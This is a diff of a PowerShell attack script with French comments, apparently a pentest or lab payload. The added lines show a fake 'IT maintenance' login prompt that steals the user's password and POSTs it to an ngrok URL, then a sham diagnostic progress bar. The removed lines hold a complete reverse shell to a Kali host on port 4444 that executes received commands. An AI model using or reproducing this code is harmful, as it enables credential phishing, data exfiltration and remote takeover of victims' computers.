@@ -1,32 +1,34 @@
+# =========================================================================
+# CONFIGURATION (À MODIFIER)
+# =========================================================================
+$NGROK_URL = "https://nonbitter-ernie-unorganisable.ngrok-free.dev"
+$KALI_IP   = "10.0.1.24"  # Ton IP Kali pour le reverse shell
+$KALI_PORT = 4444         # Ton port d'écoute nc -lvnp 4444
+# =========================================================================
 
-#Invoke-WebRequest -Uri "https://nonbitter-ernie-unorganisable.ngrok-free.dev" -Method Post -Body "Test d'exfiltration : Admin / P@ssword123"
-# 1. Demande de mot de passe (Fake Prompt)
+# 1. VOL D'IDENTIFIANTS (FAKE PROMPT)
 $caption = "Authentification Requise - Agent de Maintenance IT";
-$message = "Veuillez saisir vos identifiants pour autoriser le diagnostic du système.";
+$message = "Veuillez saisir vos identifiants de session pour autoriser le diagnostic du système.";
 $credential = $host.ui.PromptForCredential($caption, $message, "$env:userdomain\$env:username", "");
 
-
-
-$activities = @("Vérification des registres", "Analyse des pilotes réseau", "Optimisation du cache système", "Nettoyage des fichiers temporaires")
-
-for ($i = 1; $i -le 100; $i++) {
-    $activity = $activities[($i % $activities.Length)]
-    Write-Progress -Activity "Diagnostic de Maintenance en cours..." -Status "$i% Complété" -PercentComplete $i -CurrentOperation "$activity..."
-    Start-Sleep -Milliseconds 50 # Ajuste la vitesse ici pour que ça dure ~5-10 secondes
+if ($credential) {
+    $pass = $credential.GetNetworkCredential().Password;
+    $user = $credential.UserName;
+    
+    # Envoi vers ton serveur Python via Ngrok (Utilise POST pour plus de propreté)
+    # L'argument -UseBasicParsing évite l'erreur Internet Explorer
+    $body = "USER: $user | PASS: $pass"
+    Invoke-WebRequest -Uri $NGROK_URL -Method Post -Body $body -UseBasicParsing -ErrorAction SilentlyContinue;
 }
 
-Write-Host "Diagnostic terminé avec succès. Aucun problème détecté." -ForegroundColor Green
+# 2. BARRE DE CHARGEMENT VISUELLE (DECEPTION)
+$steps = "Analyse des registres","Vérification des pilotes","Optimisation du cache","Nettoyage temporaire"
+for ($i = 1; $i -le 100; $i++) {
+    $currentStep = $steps[($i % $steps.Length)]
+    # Affiche une barre de progression système Windows classique
+    Write-Progress -Activity "Diagnostic de Maintenance IT" -Status "Progression : $i%" -PercentComplete $i -CurrentOperation "$currentStep..."
+    Start-Sleep -Milliseconds 45
+}
 
-# 4. Lancement du Reverse Shell (en arrière-plan pour ne pas bloquer le script)
-$client = New-Object System.Net.Sockets.TCPClient('10.0.1.24', 4444);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-};
-$client.Close()
+Write-Host "`nDiagnostic terminé avec succès. Aucun problème détecté." -ForegroundColor Green
+Start-Sleep -Seconds 2
